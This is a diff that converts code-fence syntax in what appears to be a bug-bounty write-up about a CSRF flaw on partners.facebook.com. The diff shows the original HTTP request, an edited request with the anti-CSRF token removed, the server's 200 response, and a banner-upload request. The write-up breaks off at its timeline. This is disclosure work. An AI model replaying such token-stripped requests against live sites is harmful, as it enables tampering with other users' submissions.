@@ -1,3 +1,4 @@
+
 >CSRF in partners.facebook.com
 
 I was looking for something on internet.org, But there is an option for submitting your site to internet.org.That redirected me to this https://partners.facebook.com/cp/onboarding/ .
@@ -7,7 +8,7 @@ Jack Whitton wrote an article on site wide csrf in messenger.com. This one expla
 My sixth sense was saying that this site would be rarely visited so there would be some bugs. Intially I was trying for IDOR but it failed. Then I tried to remove the fb_dtsg the server response was 200.
 Here is the tcp dump of [ Original Request, Edited request, Response].
 
-{% highlight html %}
+```html
 
 POST /cp/onboarding/submit/ HTTP/1.1
 Host: partners.facebook.com
@@ -22,12 +23,12 @@ fb_dtsg=[token]&site_name=prashanth&short_description=asdasdasdsadasdasd&long_de
 country_configs[IN][locales][en_GB][http]=yilo.me%2F&country_configs[IN][locales][en_GB][https]=&country_configs[IN][default]=en_GB&country_configs[IN][status]=pending1&country_configs[IN][comment]&country_configs[IN][action]=add&country_configs[IN][config_fbid]=1664831780469753&
 country_configs[IN][is_editable]=true&country_configs[IN][is_deletable]=true&__user=1529285343&__a=1
 
-{% endhighlight %}
+```
 
 
 
 Edited request:
-{% highlight html %}
+```html
 POST /cp/onboarding/submit/ HTTP/1.1
 Host: partners.facebook.com
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:39.0) Gecko/20100101 Firefox/39.0
@@ -41,11 +42,11 @@ site_name=prashanth&short_description=asdasdasdsadasdasd&long_description=asdasd
 country_configs[IN][locales][en_GB][http]=yilo.me%2F&country_configs[IN][locales][en_GB][https]=&country_configs[IN][default]=en_GB&country_configs[IN][status]=pending1&country_configs[IN][comment]&country_configs[IN][action]=add&country_configs[IN][config_fbid]=1664831780469753&
 country_configs[IN][is_editable]=true&country_configs[IN][is_deletable]=true&__user=1529285343&__a=1
 
-{% endhighlight %}
+```
 
 Response:
 
-{% highlight js %}
+```js
 HTTP/1.1 200 OK
 X-Frame-Options: DENY
 Pragma: no-cache
@@ -56,12 +57,12 @@ Content-Length: 193
 
 for (;;);{"__ar":1,"payload":null,"jsmods":{"require":[["goURI"]]},"onload":["goURI(\"\\\/cp\\\/onboarding\\\/?submission_id=424609417741749\", true);"],"bootloadable":{},"ixData":{},"lid":"0"}
 
-{% endhighlight %}
+```
 
 Csrf check is missing on every endpoint of partners.facebook.com. Even some can change the submitted site using the id of the post .This could impact the site owners and there reputation.
 Another request which uploads banner photo of site
 Request:
-{% highlight html %}
+```html
 POST /cp/onboarding/images/submit/?__user=1529285343&__a=1
 Host: partners.facebook.com
 Content-Type: multipart/form-data; boundary=---------------------------3455666841143476500578378497
@@ -71,18 +72,18 @@ Content-Type: multipart/form-data; boundary=---------------------------345566684
 Content-Disposition: form-data; name="banner"; filename="love.png"
 Content-Type: image/png
 -----------------------------3455666841143476500578378497--
-{% endhighlight %}
+```
 
 
 Response:
 
-{% highlight html %}
+```html
 HTTP/1.1 200 OK
 X-Frame-Options: DENY
 Pragma: no-cache
 X-FB-Debug: Dmgrhewc6N5fT+i20ldq1OlYtN45IWMAcGGzafxtVMGqClAKvDjbysUAbMhoR1YfQjL0S5p5deoLKdlEqkBb1w==
 Date: Mon, 24 Aug 2015 10:58:38 GMT
-{% endhighlight %}
+```
 
 
 Timeline:<br>
